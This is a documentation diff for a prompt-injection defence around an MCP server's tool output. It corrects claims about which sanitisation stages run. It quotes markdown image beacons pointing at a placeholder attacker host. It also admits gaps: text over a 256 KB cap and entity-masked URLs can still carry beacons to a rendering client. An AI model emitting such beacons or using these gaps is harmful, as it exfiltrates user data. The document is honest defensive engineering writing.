@@ -222,7 +222,7 @@ channel the defence sanitises for you.
 > beacons like `![x](https://attacker/?d=…)` and embedded script blocks, and
 > they are not exported. **The way to get them is to return the content from a
 > tool registered with `server.registerCustomTool()`**, whose wrap runs all
-> five. A pipeline outside the MCP handler boundary gets Step 2 and
+> five on text within the 256 KB strip cap. A pipeline outside the MCP handler boundary gets Step 2 and
 > spotlighting, and nothing else.
 
 Outside the handler boundary, compose the two exported halves:
@@ -261,9 +261,14 @@ part the wrap runs:
 
 1. **On non-JSON text, the full strip pipeline** — the same one, with no
    options, that the built-in tools run on response headers and cURL stderr.
-   Every stage runs; nothing the text or its origin declares switches one off.
+   Nothing the text or its origin declares switches a stage off. The one
+   limit is size: text still over `STRIP_PATH_MAX_BYTES` (256 KB) after Step 2
+   is returned with Step 2 alone, so a larger part keeps its `<script>` blocks
+   and markdown beacons.
    Numeric HTML entities are never decoded, so an entity-masked beacon such as
-   `![x](&#104;ttps://host/?d=…)` is returned as the inert text it arrived as.
+   `![x](&#104;ttps://host/?d=…)` is returned with the entity preserved. That
+   is not the same as inert: a client that renders the text as CommonMark
+   decodes the reference and can load the image.
    **On text that parses as a JSON document, detection only** — the text is
    returned unchanged. Either way detection reads the original text and its
    sanitised form — on a JSON document, each escaped string token decoded on its
